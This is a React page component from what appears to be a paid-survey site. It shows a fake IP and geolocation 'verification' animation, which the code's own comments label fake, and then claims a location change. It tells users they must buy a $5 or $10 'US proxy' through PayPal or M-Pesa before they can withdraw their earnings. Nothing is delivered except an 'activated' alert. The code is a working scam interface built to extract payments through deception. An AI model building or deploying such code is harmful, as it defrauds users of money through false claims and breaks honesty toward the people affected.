import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/GeoWarning.css";
import dcProxyImg from "../assets/us-proxy.png";
import resProxyImg from "../assets/residential-proxy.png";

export default function GeoWarning() {
  const navigate = useNavigate();

  /* 🔹 Verification steps */
  const steps = [
    "Obtaining IP address…",
    "Checking geolocation…",
    "Verifying region eligibility…",
    "Cross-checking survey access…",
    "Verification completed",
  ];

  const [checking, setChecking] = useState(true);
  const [stepIndex, setStepIndex] = useState(0);

  /* 🔹 Fake verification animation */
  useEffect(() => {
    const stepTimer = setInterval(() => {
      setStepIndex((prev) => (prev < steps.length - 1 ? prev + 1 : prev));
    }, 1800);

    const finishTimer = setTimeout(() => {
      setChecking(false);
      clearInterval(stepTimer);
    }, 9000);

    return () => {
      clearInterval(stepTimer);
      clearTimeout(finishTimer);
    };
  }, []);

  /* 🔹 Load PayPal buttons */
  useEffect(() => {
    if (window.paypal) return;

    const script = document.createElement("script");
    script.src =
      "https://www.paypal.com/sdk/js?client-id=Abvr9JQwh4aABOQkIoz7Dn8kcjEaPHlDV49WPqUUR3YfKSvqYF5TBcQj6WiqsAFajtSudQfHugP0tbz8&currency=USD";
    script.async = true;
    script.onload = () => {
      // $5 Proxy
      window.paypal.Buttons({
        createOrder: (_, actions) =>
          actions.order.create({
            purchase_units: [{ amount: { value: "5.00" } }],
          }),
        onApprove: (_, actions) =>
          actions.order.capture().then(() =>
            alert("US Datacenter Proxy activated!")
          ),
      }).render("#paypal-5");

      // $10 Proxy
      window.paypal.Buttons({
        createOrder: (_, actions) =>
          actions.order.create({
            purchase_units: [{ amount: { value: "10.00" } }],
          }),
        onApprove: (_, actions) =>
          actions.order.capture().then(() =>
            alert("US Residential Proxy activated!")
          ),
      }).render("#paypal-10");
    };

    document.body.appendChild(script);
  }, []);

  /* 🔹 Handle M-Pesa links */
  const handlePayHero = (link) => {
    window.location.href = link;
  };

  /* 🔹 Navigate to WithdrawP */
  const handleProceedWithdraw = () => {
    navigate("/withdrawp"); // Balance will be handled in WithdrawP
  };

  return (
    <div className="geo-page">
      <div className="geo-card">
        {/* 🔹 Verification overlay */}
        {checking && (
          <div className="checking-overlay">
            <div className="checking-box">
              <div className="spinner" />
              <p className="checking-text">{steps[stepIndex]}</p>
              <span className="checking-sub">Please do not refresh</span>
            </div>
          </div>
        )}

        {/* 🔹 Main content */}
        <div className={`geo-content ${checking ? "blurred" : ""}`}>
          <h1>
            ⚠ Location Change Detected
            <span>You must purchase a verified proxy to continue</span>
          </h1>

          <div className="proxy-list">
            {/* 🔹 $5 Proxy */}
            <div className="proxy-card">
              <img src={dcProxyImg} alt="US Datacenter Proxy" />
              <h3>US Datacenter Proxy</h3>
              <ul>
                <li>12 months access to all surveys</li>
                <li>Unlimited connections</li>
                <li>Secure & reliable</li>
              </ul>
              <div className="proxy-price">$5.00</div>
              <div id="paypal-5" className="paypal-box" />
              <button
                className="payhero-btn"
                onClick={() =>
                  handlePayHero(
                    "https://short.payhero.co.ke/s/Eu3pgvZXvToB6A2hCnrEXs"
                  )
                }
              >
                Pay with M-Pesa
              </button>
            </div>

            {/* 🔹 $10 Proxy */}
            <div className="proxy-card premium">
              <img src={resProxyImg} alt="US Residential Proxy" />
              <h3>US Residential Proxy</h3>
              <ul>
                <li>12 months access to all surveys</li>
                <li>Unlimited connections</li>
                <li>Highest trust level</li>
              </ul>
              <div className="proxy-price">$10.00</div>
              <div id="paypal-10" className="paypal-box" />
              <button
                className="payhero-btn"
                onClick={() =>
                  handlePayHero(
                    "https://short.payhero.co.ke/s/mviUCspWrArjBUGs6jetEg"
                  )
                }
              >
                Pay with M-Pesa
              </button>
            </div>
          </div>

          {/* 🔹 Proceed & Withdraw button */}
          {!checking && (
            <button
              className="proceed-withdraw-btn"
              onClick={handleProceedWithdraw}
            >
              Proceed & Withdraw
            </button>
          )}
        </div>
      </div>
    </div>
  );
}

